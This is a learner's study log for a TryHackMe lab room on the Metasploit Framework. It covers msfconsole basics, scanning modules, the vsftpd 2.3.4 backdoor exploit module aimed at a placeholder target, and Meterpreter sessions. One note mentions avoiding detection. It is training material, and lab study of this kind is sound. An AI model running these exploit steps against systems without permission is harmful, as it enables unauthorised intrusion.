# 📅· Day 29

## 💣 Metasploit: Exploitation (TryHackMe)

Room: **Metasploit: Exploitation**
Objective: Learn how to use **Metasploit Framework** for scanning, vulnerability assessment, and exploitation in a controlled environment.

---

## 🎯 Day Objectives

* Understand what Metasploit is and why it is used
* Learn the structure of the Metasploit Framework
* Perform basic scanning and enumeration with Metasploit
* Use Metasploit modules to exploit vulnerabilities
* Understand payloads, sessions, and post-exploitation basics

---

## 🧠 What Is Metasploit?

Metasploit Framework is a **penetration testing platform** that allows security professionals to:

* Scan systems
* Identify vulnerabilities
* Develop and execute exploits
* Perform post-exploitation tasks

It is widely used in **Red Team operations**, security assessments, and training labs.

---

## 🧱 Metasploit Architecture

Key components:

* **Exploit**: Code that takes advantage of a vulnerability
* **Payload**: Code executed on the target system
* **Auxiliary**: Modules for scanning and enumeration
* **Post**: Modules for post-exploitation
* **Encoder / NOP**: Used to avoid detection

---

## 🚀 Starting Metasploit

Launch the Metasploit console:

```
msfconsole
```

Helpful commands:

```
help
search <keyword>
info <module>
```

---

## 🔍 Scanning & Enumeration

Example: port scanning using auxiliary modules:

```
use auxiliary/scanner/portscan/tcp
set RHOSTS target_ip
run
```

Service and vulnerability scanning:

```
use auxiliary/scanner/ssh/ssh_version
run
```

Metasploit can complement tools like Nmap during enumeration.

---

## 💥 Exploitation Workflow

Typical exploitation steps:

1. Identify a vulnerable service
2. Search for a relevant exploit
3. Configure exploit options
4. Select a payload
5. Launch the exploit
6. Obtain a session

---

## 🧨 Using an Exploit Module

Example:

```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS target_ip
run
```

If successful, Metasploit opens a **session**.

---

## 🧬 Payloads

Payload types:

* **Singles**: Small, inline payloads
* **Stagers**: Establish connection
* **Stages**: Full-featured payloads

Common payload:

* `meterpreter`

---

## 🧾 Sessions & Meterpreter

List active sessions:

```
sessions
```

Interact with a session:

```
sessions -i 1
```

Meterpreter capabilities:

* File system access
* Process enumeration
* Privilege escalation checks

---

## 🧪 What I Learned Today

* Metasploit simplifies exploitation workflows
* Proper enumeration is critical before exploitation
* Payload selection matters
* Sessions allow post-exploitation activities

---

## 📝 Personal Notes

* Metasploit should be used carefully to avoid detection
* Best combined with manual testing
* Extremely powerful in internal network scenarios

---

